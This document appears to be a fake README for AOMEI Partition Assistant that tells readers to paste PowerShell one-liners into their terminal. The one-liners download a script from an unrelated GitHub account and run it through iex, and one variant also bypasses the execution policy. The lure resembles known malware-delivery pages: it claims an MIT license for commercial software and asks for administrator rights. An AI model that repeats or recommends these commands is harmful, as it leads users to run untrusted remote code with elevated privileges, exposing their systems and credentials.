# AOMEI Partition Assistant Setup
the powerful disk partition manager for resizing, merging, cloning, and recovering partitions without any data loss.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for disk write and partition table modification.
- Downloads AOMEI Partition Assistant installer silently.
- Detects all connected disks and current partitions automatically.
- Applies partition operations safely with pre-operation backup verification.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~160 MB free disk space

## Troubleshooting

**OS migration to a new SSD fails and the system will not boot**

Disable Secure Boot temporarily in BIOS before migrating â€” re-enable it after migration completes.

**Dynamic disk is shown as Not Supported for partition operations**

Use the Convert to Basic Disk feature first, then retry the desired partition operation.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.